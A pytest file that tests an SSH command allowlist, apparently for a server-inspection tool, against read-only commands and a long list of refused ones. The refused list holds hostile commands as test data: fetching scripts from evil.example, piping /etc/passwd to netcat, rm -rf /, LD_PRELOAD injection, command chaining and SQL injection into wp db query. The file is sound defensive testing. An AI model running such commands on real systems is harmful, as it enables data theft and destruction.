"""The SSH command policy must allow read-only commands and refuse writes, network, shells and chaining."""

import shlex

import pytest

from handscheck.ssh.policy import DEFAULT_POLICY, WP_DB_QUERIES, CommandPolicy, PolicyViolation

ALLOWED = [
    "cat /etc/os-release",
    "/usr/bin/cat /etc/passwd",
    "ls -la /var/www",
    "stat -c '%W %Z' /etc/passwd",
    "head -n 50 /var/log/auth.log",
    "tail -n 200 /var/log/apache2/error.log",
    "find /var/www -name '*.php' -newer /etc/hostname -type f",
    "find /dev/shm -maxdepth 2 -printf '%p %s\\n'",
    "grep -rE 'eval\\(|base64_decode' /var/www/alpha",  # quoted | and ( are literal pattern characters
    "grep -c 'a;b' /etc/passwd",
    "grep -c ';' /etc/passwd",
    "grep -c \\; /etc/passwd",
    "grep -F '|' /etc/passwd",
    'grep -E "a|b" /etc/passwd',
    "grep -e '>' -e \"<\" /etc/passwd",
    "sha256sum /usr/bin/sudo",
    "id -un",
    "uname -a",
    "date +%s",
    "date -u",
    "hostname -f",
    "ps auxww",
    "ss -tlnp",
    "df -h",
    "getent passwd",
    "dpkg -l",
    "dpkg -S /usr/bin/sudo",
    "dpkg-query -W -f '${Package} ${Version}\\n'",
    "apt-cache policy openssl",
    "systemctl list-units --type=service --no-pager",
    "systemctl status apache2",
    "systemctl is-active ssh",
    "journalctl -u ssh --since=-1h --no-pager -n 100",
    "crontab -l",
    "crontab -l -u www-data",
    "php -v",
    "ip -br addr show",
    "ip route",
    "lastlog",
    "sort -u /etc/shells",
    "uniq /etc/shells",
    "wp --version",
    "wp cli version",
    "wp core version --path=/var/www/alpha",
    "wp cli info",
    "which wp",
    "file /var/www/alpha/wp-content/uploads/x.jpg",
    "sudo cat /etc/shadow",
    "sudo -n -- ls /root",
    "sudo -n -u www-data -- wp core version --path=/var/www/a --skip-plugins --skip-themes",
    "true",
]

REFUSED = [
    # writes and deletes
    ("rm -rf /", "write or delete"),
    ("/bin/rm /tmp/x", "write or delete"),
    ("touch /tmp/x", "write or delete"),
    ("tee /tmp/x", "write or delete"),
    ("cp /etc/passwd /tmp/p", "write or delete"),
    ("mv a b", "write or delete"),
    ("chmod 777 /etc/passwd", "write or delete"),
    ("dd if=/dev/zero of=/dev/sda", "write or delete"),
    ("sed -i s/a/b/ /etc/hosts", "write or delete"),
    ("sed -n 1,5p /etc/hosts", "write or delete"),  # sed scripts can write (w) and execute (e)
    ("awk '{print}' /etc/passwd", "write or delete"),
    ("find / -name x -delete", "-delete"),
    ("find / -name x -exec rm {} \\;", "-exec"),
    ("find / -name x -execdir id \\;", "-execdir"),
    ("find / -fprint /tmp/out", "-fprint"),
    ("sort -o /etc/passwd /etc/passwd", "-o"),
    ("sort --output=/tmp/x /etc/passwd", "--output"),
    ("sort --out=/tmp/x /etc/passwd", "--output"),  # GNU accepts abbreviations
    ("uniq /etc/passwd /tmp/out", "OUTPUT"),
    ("date -s '2020-01-01'", "-s"),
    ("date 010100002020", "clock"),
    ("hostname evil", "arguments"),
    ("lastlog -C -u root", "-C"),
    ("file -C -m /tmp/magic", "-C"),
    ("crontab -r", "crontab -l"),
    ("crontab /tmp/evil", "crontab -l"),
    ("crontab -e", "crontab -l"),
    # packages, services, system state
    ("apt-get install nmap", "package"),
    ("apt install -y nc", "package"),
    ("dpkg -i /tmp/x.deb", "option -i"),
    ("dpkg --purge openssh-server", "option --purge"),
    ("dpkg", "query option"),
    ("apt-cache gencaches", "subcommand"),
    ("apt-cache -o Dir::Cache=/tmp policy", "-o"),
    ("systemctl restart apache2", "systemctl restart"),
    ("systemctl stop ssh", "systemctl stop"),
    ("systemctl enable evil.service", "systemctl enable"),
    ("systemctl -H otherhost status", "-H"),
    ("service apache2 restart", "services"),
    ("reboot", "services"),
    ("kill -9 1", "services"),
    ("journalctl --vacuum-time=1s", "--vacuum-time"),
    ("journalctl --rotate", "--rotate"),
    ("journalctl -f", "-f"),
    ("journalctl -fu ssh", "-f"),
    ("tail -f /var/log/syslog", "-f"),
    ("tail -n5 -F /var/log/syslog", "-F"),
    ("tail --follow=name /var/log/syslog", "--follow"),
    ("tail --foll /var/log/syslog", "--follow"),
    ("ss -K dst 1.2.3.4", "-K"),
    ("ip addr add 10.0.0.1/24 dev eth0", "only show"),
    ("ip -batch /tmp/cmds", "-batch"),
    ("ip link set eth0 down", "only show"),
    ("useradd evil", "users"),
    ("passwd root", "users"),
    ("mount /dev/sdb /mnt", "system state"),
    ("iptables -F", "system state"),
    # network
    ("curl http://evil.example/x.sh", "network"),
    ("wget -O- http://evil.example", "network"),
    ("nc -l 4444", "network"),
    ("ssh other-host", "network"),
    ("scp a b:", "network"),
    ("git clone https://x", "network"),
    # shells and interpreters
    ("bash -c 'cat /etc/passwd'", "shell"),
    ("sh -c id", "shell"),
    ("/bin/sh", "shell"),
    ("python3 -c 'import os'", "shell"),
    ("perl -e 'print 1'", "write or delete"),
    ("php -r 'system(\"id\");'", "option -r"),
    ("php /tmp/x.php", "arguments"),
    ("env cat /etc/passwd", "shell"),
    ("xargs rm", "shell"),
    ("timeout 5 cat /etc/passwd", "shell"),
    ("nohup cat /x", "shell"),
    ("eval id", "shell"),
    # shell syntax
    ("cat /etc/passwd; rm -rf /", "chaining (;)"),
    ("cat /etc/passwd;rm -rf /", "chaining (;)"),
    ("cat /etc/passwd && rm -rf /", "chaining (&&)"),
    ("cat /etc/passwd || id", "chaining (||)"),
    ("cat /etc/passwd | nc evil 80", "pipes"),
    ("cat /etc/passwd > /tmp/x", "redirection"),
    ("cat /etc/passwd >> /tmp/x", "redirection"),
    ("cat /etc/passwd 2>/dev/null", "redirection"),
    ("cat < /etc/passwd", "redirection"),
    ("cat /etc/passwd &", "background"),
    ("(cat /etc/passwd)", "subshell"),
    ("cat $(echo /etc/passwd)", "subshell"),
    ("cat `id`", "substitution"),
    ('cat "$(id)"', "substitution"),  # quoted substitution is still refused, for clarity
    ("cat /etc/passwd\nrm -rf /", "newline"),
    ("cat /etc/passwd\rrm", "carriage return"),
    ("cat 'unterminated", "parse"),
    ("", "empty"),
    ("   ", "empty"),
    ("FOO=bar cat /etc/passwd", "environment"),
    ("LD_PRELOAD=/tmp/x.so ls", "environment"),
    ("./cat /etc/passwd", "system bin"),
    ("/tmp/cat /etc/passwd", "system bin"),
    ("/usr/bin/../../tmp/cat x", "system bin"),
    ("/usr/bin//cat x", "system bin"),
    # wp-cli
    ("wp plugin install hello --activate", "wp plugin install"),
    ("wp eval 'echo 1;'", "wp eval"),
    ("wp core version --exec='system(\"id\");'", "--exec"),
    ("wp core version --require=/tmp/x.php", "--require"),
    ("wp core version --ssh=root@other", "--ssh"),
    # Loading WordPress spawns wp-cron (a loopback HTTP request running scheduled events): refused (M3).
    ("wp plugin list --path=/var/www/a --skip-plugins --skip-themes", "loads WordPress"),
    ("wp user list --skip-plugins --skip-themes", "loads WordPress"),
    ("wp option get siteurl --skip-plugins --skip-themes", "loads WordPress"),
    ("wp cron event list --skip-plugins --skip-themes", "loads WordPress"),
    ("wp core verify-checksums --skip-plugins --skip-themes", "wp core verify-checksums"),
    ("wp user create evil e@x --role=administrator", "wp user create"),
    ("wp option update siteurl http://evil", "wp option update"),
    ("wp cron event run --all --skip-plugins --skip-themes", "loads WordPress"),
    ("wp db export --skip-plugins --skip-themes", "wp db export"),
    # sudo
    ("sudo rm -rf /", "write or delete"),
    ("sudo -i", "sudo option -i"),
    ("sudo -s", "sudo option -s"),
    ("sudo -E cat /etc/shadow", "sudo option -E"),
    ("sudo -u mysql cat /x", "sudo as 'mysql'"),
    ("sudo --user=postgres ls", "sudo as 'postgres'"),
    ("sudo sudo cat /etc/shadow", "nested sudo"),
    ("sudo", "needs a command"),
    ("sudo bash", "shell"),
    ("sudo cat /etc/passwd; id", "chaining"),
    # default deny
    ("nmap localhost", "allowlist"),
    ("frobnicate", "allowlist"),
]


@pytest.mark.parametrize("command", ALLOWED)
def test_allowed(command: str) -> None:
    decision = DEFAULT_POLICY.check(command)
    assert decision.allowed, decision.reason


@pytest.mark.parametrize(("command", "reason"), REFUSED, ids=[c for c, _ in REFUSED])
def test_refused_with_reason(command: str, reason: str) -> None:
    decision = DEFAULT_POLICY.check(command)
    assert not decision.allowed
    assert reason.lower() in decision.reason.lower(), decision.reason
    assert decision.argv == ()


def test_enforce_raises_with_reason() -> None:
    with pytest.raises(PolicyViolation) as info:
        DEFAULT_POLICY.enforce("rm -rf /var/www")
    assert "rm" in info.value.reason
    assert info.value.command == "rm -rf /var/www"


def test_normalized_command_quotes_every_word() -> None:
    decision = DEFAULT_POLICY.enforce("grep -E 'a|b;c' '/var/www/my site/*.php'")
    assert decision.command == "grep -E 'a|b;c' '/var/www/my site/*.php'"
    # What we send parses back to exactly the words we checked: nothing for the remote shell to interpret.
    assert tuple(shlex.split(decision.command)) == decision.argv


def test_normalized_command_has_no_unquoted_specials() -> None:
    decision = DEFAULT_POLICY.enforce(["cat", "~/x", "*.php", "$HOME", "a b"])
    assert decision.command == "cat '~/x' '*.php' '$HOME' 'a b'"


def test_argv_input_is_checked_too() -> None:
    assert not DEFAULT_POLICY.check(["rm", "-rf", "/"]).allowed
    assert not DEFAULT_POLICY.check(["cat", "$(id)"]).allowed
    assert not DEFAULT_POLICY.check(["cat", "a\nb"]).allowed
    assert DEFAULT_POLICY.check(["cat", "/etc/passwd"]).allowed


def test_sudo_is_normalized_to_non_interactive() -> None:
    assert DEFAULT_POLICY.enforce("sudo cat /etc/shadow").argv == ("sudo", "-n", "--", "cat", "/etc/shadow")
    decision = DEFAULT_POLICY.enforce("sudo -u www-data wp --version")
    assert decision.argv == ("sudo", "-n", "-u", "www-data", "--", "wp", "--version")
    assert decision.sudo_user == "www-data"
    assert DEFAULT_POLICY.enforce("cat /x").sudo_user is None


def test_sudo_users_are_configurable() -> None:
    strict = CommandPolicy(sudo_users=frozenset({"root"}))
    assert not strict.check("sudo -u www-data wp --version").allowed
    assert strict.check("sudo ls /root").allowed


def test_overlong_command_refused() -> None:
    decision = DEFAULT_POLICY.check("cat " + "a" * 9000)
    assert not decision.allowed
    assert "longer than" in decision.reason


def test_variables_are_sent_literally() -> None:
    decision = DEFAULT_POLICY.enforce("dpkg-query -W -f '${Package}\\n' ${HOME}")
    assert decision.command == "dpkg-query -W -f '${Package}\\n' '${HOME}'"


def test_wp_db_query_runs_only_the_fixed_templates() -> None:
    for template in WP_DB_QUERIES.values():
        for prefix in ("wp_", "x7_site2_"):
            sql = template.format(p=prefix)
            decision = DEFAULT_POLICY.check(
                ["sudo", "-u", "www-data", "wp", "db", "query", sql, "--path=/var/www/a"]
            )
            assert decision.allowed, decision.reason
    admins = WP_DB_QUERIES["admins"]
    refused = [
        ["wp", "db", "query", "DELETE FROM wp_users", "--path=/a"],
        [
            "wp",
            "db",
            "query",
            WP_DB_QUERIES["first_user"].format(p="wp_") + "; DROP TABLE wp_users",
            "--path=/a",
        ],
        [
            "wp",
            "db",
            "query",
            admins.format(p="wp_").replace("wp_capabilities", "x_capabilities"),
            "--path=/a",
        ],
        ["wp", "db", "query", admins.format(p="wp-x"), "--path=/a"],
        ["wp", "db", "query", WP_DB_QUERIES["first_user"].format(p="wp_"), "--path=/a", "--execute=DROP"],
        ["wp", "db", "query", WP_DB_QUERIES["first_user"].format(p="wp_"), "--defaults-file=/tmp/x"],
        ["wp", "db", "query"],
        ["wp", "db", "export", "/tmp/x.sql"],
        ["wp", "db", "query", "SELECT user_pass FROM wp_users", "--path=/a"],
        # sessions: the prefix must be the same everywhere, and nothing may be appended or swapped in
        [
            "wp",
            "db",
            "query",
            WP_DB_QUERIES["sessions"].format(p="wp_").replace("wp_capabilities", "x_capabilities"),
            "--path=/a",
        ],
        [
            "wp",
            "db",
            "query",
            WP_DB_QUERIES["sessions"].format(p="wp_").replace("u.user_email", "u.user_pass"),
            "--path=/a",
        ],
        ["wp", "db", "query", WP_DB_QUERIES["sessions"].format(p="wp_") + " UNION SELECT 1", "--path=/a"],
    ]
    for argv in refused:
        assert not DEFAULT_POLICY.check(argv).allowed, argv
